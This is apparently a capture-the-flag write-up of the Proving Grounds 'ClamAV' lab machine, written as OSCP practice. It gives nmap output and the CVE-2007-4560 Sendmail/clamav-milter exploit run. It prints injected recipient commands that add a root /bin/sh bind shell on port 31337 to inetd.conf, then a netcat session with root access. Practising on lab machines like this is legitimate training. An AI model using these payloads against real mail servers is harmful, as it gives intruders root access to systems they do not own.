---
title: Offensive-Security–Proving-Grounds–ClamAV-Write-up
published: true
ayout: post
date: 2024-10-27 18:54 +0600
categories: [OSCP]
tags: [ctf,oscp] 
---

# Machine Type: Linux

## Attack Walkthrough 


### Step 1: Service Enumeration with Nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 07:21 EDT
Warning: 192.168.248.42 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.248.42
Host is up (0.10s latency).
Not shown: 65347 closed tcp ports (conn-refused), 181 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.192], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-27T11:22:30-04:00
|_clock-skew: mean: 5h59m59s, deviation: 2h49m43s, median: 3h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.02 seconds

```


**Run Nmap Scan**: 
Use Nmap to discover open services on the target. The following services are detected: - **SSH** - **HTTP** - **SMTP** - **SMB** ```


**No Accessible SMB Shares**: After checking for accessible shares, none were found on the SMB service.

### Step 2: Exploit Research for SMTP Service

1. **Research SMTP Version for Exploits**: After identifying the SMTP server version, a quick search online revealed the following exploit:
    
    - **Exploit**: Sendmail with clamav-milter < 0.91.2 - Remote Command Execution
    - **CVE**: CVE-2007-4560
    
    This exploit affects the version running on the target and is capable of remote command execution.
    
2. **Interesting Detail**: Notably, the machine's hostname is **clamav**, aligning with the exploit details. The exploit opens a new port (31337) on the target for a root shell (`/bin/sh`).


### Step 3: Executing the Exploit

1. **Run the Exploit**: Execute the exploit to open port 31337, providing access to a root shell on the target.


```
perl 4761.pl $target                                                                                                                                                                   ✔  1072  07:29:00 
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.248.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sun, 27 Oct 2024 19:38:00 -0400; (No UCE/UBE) logging access from: [192.168.251.248](FAIL)-[192.168.251.248]
250-localhost.localdomain Hello [192.168.251.248], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 49RNc0PA004595 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```


**Connect to Root Shell**: Once confirmed, connect to port 31337 to access the root shell.

```
c -nv  $target 31337                                                                                                                                                    1 ↵  1080  15:33:58 
(UNKNOWN) [192.168.248.42] 31337 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
xxxxxxxxxxxxxxxxxxxx

```

### Conclusion

By leveraging the CVE-2007-4560 exploit, a root shell was successfully established on the target system.